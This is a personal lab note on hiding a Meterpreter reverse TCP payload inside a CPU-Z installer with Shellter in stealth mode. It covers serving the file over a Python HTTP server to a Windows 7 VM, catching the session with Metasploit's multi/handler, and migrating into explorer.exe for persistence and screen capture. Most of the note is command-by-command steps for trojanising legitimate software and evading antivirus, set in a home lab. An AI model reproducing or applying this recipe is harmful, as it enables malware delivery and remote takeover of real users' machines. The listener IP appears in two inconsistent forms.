#topic Metasploit and Shellter

Using Kali Linux for attacking and Windows 7 as a Victim

---
## 2025-08-17
**Set-up:**  
- Install shellter and wine 32 on Kali Linux.
- Install cupz on Kali Linux so we can add a meterpreter reverse tcp payload in it.

**Managing the downloaded file :** 
```
cd Desktop
mkdir av-bypass
cp /home/kali/Downloads/cpu-z_1.96-en.exe av-bypass
cd av-bypass
ls
mv cpu-z_1.96-en.exe cpuz.exe
ls
```

**Adding the payload:**
```
**sudo shellter**
**A** (automatic)
PE target: **/home/kali/Desktop/av-bypass/cpuz.exe**
Enable stealth mode: **Y**
Use a listed payload or custom? : **L**
Choose Meterpreter_Reverse_TCP
**SET LHOSTS: (ifconfig to check on kali)**
**SET LPORT: 4321** (remember the port and you can add any port you like, this one is just for example)
...
Injection : Verified!

```

Sharing the file using the HTTP server:
```
(its possible only because both the VMs are on the same NAT network)
(On kali)
**`python -m http.server 8080`** 

(On Windows)
the IP of kali machine followed by the port no. on the windows browser. 
**192.168.15.8:8080** 
navigate the injected file on the server
```

Using Metasploit:
```
(On kali)
**msfconsole**
**use exploit/multi/handler**
**set payload windows/meterpreter/reverse_tcp**
**show options** ( Check the requirements )
**set LHOST 192.68.15.8** (same as we added while injection)
**set LPORT 4321** (same one)
**show options** (final check)
**exploit**

(on windows)
open the cpuz.exe file

(On Kali)
**help** (for all the available option)
( the session will be closed if the app is closed in the windows, so we migrate to another open service which is mostly open like explorer.exe)
**ps** (List running programs)
**migrate PID** (process ID)
(use **help** to explore)
one example 
**screenshare**


```